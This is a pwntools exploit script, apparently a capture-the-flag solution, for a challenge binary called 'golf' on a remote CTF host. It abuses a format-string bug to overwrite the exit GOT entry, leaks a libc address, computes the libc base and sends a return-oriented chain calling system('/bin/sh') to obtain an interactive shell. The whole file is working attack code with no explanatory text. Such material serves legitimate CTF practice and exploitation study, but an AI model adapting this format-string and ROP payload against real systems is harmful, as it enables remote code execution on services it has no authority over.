from pwn import *

elf = ELF("golf")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#p = elf.process()
p = remote("golf.chal.imaginaryctf.org", 1337)
raw_input("DEBUG")

pop_rdi = 0x00000000004012f3
ret = pop_rdi + 1

payload = b"%*10$d"
payload += b"%9$n"
payload += b"\x00"*14
payload += p64(elf.got['exit'])
payload += p64(elf.sym['main'])

p.sendline(payload)


#leaking libc address
payload = b"%19$p"
p.sendline(payload)

a = p.recvuntil("0x",drop = True)
leak = p.recvuntil(b"\n",drop = True)
leak = leak.decode("utf-8")
leak = "0x" + leak
print(leak)
leak = int(leak,16)
libc.address = leak - 0x1eca03
one_gadgets = libc.address + 0xe3b04

log.info("LIBC BASE: " + hex(libc.address))

system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload = b"%*10$d"
payload += b"%9$n"
payload += b"\x00"*14
payload += p64(elf.got['exit'])
payload += p64(0x00000000004012e6)
payload += b"B"*8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(ret)
payload += p64(libc.sym['system'])

p.sendline(payload)

p.interactive()
